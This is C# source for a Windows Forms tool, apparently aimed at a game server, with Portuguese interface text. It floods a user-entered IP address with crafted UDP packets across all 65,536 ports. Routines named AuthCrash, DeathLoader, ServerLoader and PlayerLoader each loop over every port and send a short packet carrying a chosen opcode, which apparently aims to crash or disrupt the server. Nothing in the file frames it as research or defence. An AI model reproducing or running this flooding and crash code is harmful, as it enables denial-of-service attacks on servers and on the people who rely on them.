using MachineBytes;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace MachineBytes
{
    public partial class Machine_Avançado : Form
    {
        public int count = 0;
        public bool seach = false, BloquearFlod = false;
        public static Machine Machine;
        public Machine_Avançado()
        {
            InitializeComponent();
        }
        #region Buttons
        private void Button1_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(ShopLoader)).Start();
            Application.DoEvents();
        }
        private void Button2_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Deseja Finalizar?", "Machine", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                Close();
            }
        }
        private void Button3_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }
        private void Button4_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(SyncRemoverFlod)).Start();
        }
        private void Button5_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(AuthCrash)).Start();
        }
        private void Button6_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(ServerLoader)).Start();
            Application.DoEvents();
        }
        private void Button7_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(PlayerLoader)).Start();
        }
        private void Button8_Click_1(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                for (int i = 0; i <= IPEndPoint.MaxPort; i++)
                {
                    if (BloquearFlod)
                        break;
                    try
                    {
                        IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), i);
                        UdpClient udpClient = new UdpClient()//1915
                        {
                            ExclusiveAddressUse = false,
                        };
                        udpClient.Client.Connect(iPEndPoint);
                        udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        if (udpClient.Client.Connected)
                        {
                            SendPacket s = new SendPacket();
                            s.WriteH(23);
                            s.WriteC(3);
                            udpClient.Client.Send(s.stream.ToArray(), s.stream.ToArray().Length, SocketFlags.None);
                            udpClient.Close();
                        }
                        label6.Text = $"Procurando Porta [{i}]";
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                    }
                }
                new Thread(new ThreadStart(SyncRemoverFlod)).Start();
            }).Start();
        }
        private void Button9_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(DeathLoader)).Start();
        }
        private void Button10_Click(object sender, EventArgs e)
        {
            try
            {
                IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), 1910);
                UdpClient udpClient = new UdpClient()
                {
                    ExclusiveAddressUse = false
                };
                udpClient.Client.Connect(iPEndPoint);
                udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                if (udpClient.Client.Connected)
                {
                    MessageBox.Show("UDP Address : " + ((IPEndPoint)udpClient.Client.LocalEndPoint).Address.ToString());
                    MessageBox.Show("UDP Port : " + ((IPEndPoint)udpClient.Client.LocalEndPoint).Port.ToString());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        #endregion
        #region Sender
        public void ShopLoader()
        {
            new Thread(() =>
            {
                for (int i = 0; i <= IPEndPoint.MaxPort; i++)
                {
                    if (BloquearFlod)
                        break;
                    try
                    {
                        IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), i);
                        UdpClient udpClient = new UdpClient()//1915
                        {
                            ExclusiveAddressUse = false,
                        };
                        udpClient.Client.Connect(iPEndPoint);
                        udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        if (udpClient.Client.Connected)
                        {
                            SendPacket s = new SendPacket();
                            s.WriteH(22);
                            s.WriteD(0); //TYPE
                            udpClient.Client.Send(s.stream.ToArray(), s.stream.ToArray().Length, SocketFlags.None);
                            udpClient.Client.Close();
                        }
                        label6.Text = $"Procurando Porta [{i}]";
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        break;
                    }

                }
                new Thread(new ThreadStart(SyncRemoverFlod)).Start();
            }).Start();
        }
        public void ServerLoader()
        {
            new Thread(() =>
            {
                for (int i = 0; i <= IPEndPoint.MaxPort; i++)
                {
                    if (BloquearFlod)
                        break;
                    try
                    {
                        IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), i);
                        UdpClient udpClient = new UdpClient()//1915
                        {
                            ExclusiveAddressUse = false,
                        };
                        udpClient.Client.Connect(iPEndPoint);
                        udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        if (udpClient.Client.Connected)
                        {
                            SendPacket s = new SendPacket();
                            s.WriteH(20);
                            s.WriteD(0);
                            udpClient.Client.Send(s.stream.ToArray(), s.stream.ToArray().Length, SocketFlags.None);
                            udpClient.Close();
                        }
                        label6.Text = $"Procurando Porta [{i}]";
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        break;
                    }
                }
                new Thread(new ThreadStart(SyncRemoverFlod)).Start();
            }).Start();
        }
        public void AuthCrash()
        {
            new Thread(() =>
            {
                for (int i = 0; i <= IPEndPoint.MaxPort; i++)
                {
                    if (BloquearFlod)
                        break;
                    try
                    {
                        IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), i);
                        UdpClient udpClient = new UdpClient()//1915
                        {
                            ExclusiveAddressUse = false,
                        };
                        udpClient.Client.Connect(iPEndPoint);
                        udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        if (udpClient.Client.Connected)
                        {
                            SendPacket s = new SendPacket();
                            s.WriteH(15);
                            s.WriteC(0);
                            udpClient.Client.Send(s.stream.ToArray(), s.stream.ToArray().Length, SocketFlags.None);
                            udpClient.Close();
                        }
                        label6.Text = $"Procurando Porta [{i}]";
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        break;
                    }
                }
                new Thread(new ThreadStart(SyncRemoverFlod)).Start();
            }).Start();
        }
        public int GetAvailablePort(int startingPort)
        {
            IPEndPoint[] endPoints;
            List<int> portArray = new List<int>();

            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

            //getting active connections
            TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();
            portArray.AddRange(from n in connections
                               where n.LocalEndPoint.Port >= startingPort
                               select n.LocalEndPoint.Port);

            //getting active udp listeners
            endPoints = properties.GetActiveUdpListeners();
            portArray.AddRange(from n in endPoints
                               where n.Port >= startingPort
                               select n.Port);

            portArray.Sort();

            for (int i = startingPort; i < short.MaxValue; i++)
                if (!portArray.Contains(i))
                    return i;

            return 0;
        }
        public void BattleSyncRemover()
        {
            int port = 0;
            new Thread(() =>
            {
                do
                {
                    if (BloquearFlod)
                        break;
                    try
                    {
                        IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), port);
                        UdpClient udpClient = new UdpClient()
                        {
                            ExclusiveAddressUse = false,
                        };
                        udpClient.Client.Connect(iPEndPoint);
                        if (port  != ((IPEndPoint)udpClient.Client.LocalEndPoint).Port)
                        {
                            udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                            if (udpClient.Client.Connected)
                            {
                                SendPacket s = new SendPacket();
                                s.WriteH(1);
                                s.WriteD(01051999);
                                s.WriteD(new Random().Next(0, 100));
                                label6.Invoke(new Action(() => label6.Text = $"local:[{iPEndPoint.Address.ToString()}:{port}] / {IPEndPoint.MaxPort}"));
                                udpClient.Client.Send(s.stream.ToArray(), s.stream.ToArray().Length, SocketFlags.None);
                                udpClient.Close();
                            }
                        }
                        if (port >= ushort.MaxValue)
                            port = 0;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        break;
                    }
                } while (++port <= IPEndPoint.MaxPort);
                new Thread(new ThreadStart(SyncRemoverFlod)).Start();
            }).Start();
        }
        public void PlayerLoader()
        {
            new Thread(() =>
            {
                for (int i = 0; i <= ushort.MaxValue; i++)
                {
                    if(BloquearFlod)
                        break;
                    try
                    {
                        IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), i);
                        UdpClient udpClient = new UdpClient()//1915
                        {
                            ExclusiveAddressUse = false,
                        };
                        udpClient.Client.Connect(iPEndPoint);
                        udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        if (udpClient.Client.Connected)
                        {
                            SendPacket s = new SendPacket();
                            s.WriteH(999);
                            udpClient.Client.Send(s.stream.ToArray(), s.stream.ToArray().Length, SocketFlags.None);
                            udpClient.Client.Close();
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        break;
                    }
                    label6.Invoke(new Action(() => label6.Text = $"Procurando Porta [{i}]"));
                }
                Button4_Click(null, new EventArgs());
            }).Start();
        }
        public void DeathLoader()
        {
            new Thread(() =>
            {
                for (int i = 0; i <= IPEndPoint.MaxPort; i++)
                {
                    if (BloquearFlod)
                        break;
                    try
                    {
                        IPEndPoint iPEndPoint = new IPEndPoint(IPAddress.Parse(textBox1.Text), i);
                        UdpClient udpClient = new UdpClient()//1915
                        {
                            ExclusiveAddressUse = false,
                        };
                        udpClient.Client.Connect(iPEndPoint);
                        udpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        if (udpClient.Client.Connected)
                        {
                            SendPacket p = new SendPacket();
                            p.WriteH(1);
                            p.WriteQ(0);
                            udpClient.Client.Send(p.stream.ToArray(), p.stream.ToArray().Length, SocketFlags.None);
                            udpClient.Client.Close();
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        break;
                    }
                    label6.Invoke(new Action(() => label6.Text = $"Procurando Porta [{i}]"));
                }
                Button4_Click(null, new EventArgs());
            }).Start();
        }
        public void SyncRemoverFlod()
        {
            BloquearFlod = true;
            Thread.Sleep(300);
            count = 0;
            BloquearFlod = false;
            label6.Text = "Esperando o Loop...";
        }
        #endregion
        #region ReleaseCapture
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        public const int WM_LBUTTONDOWN = 0x0201;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_LBUTTONDOWN)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        #endregion
    }
}
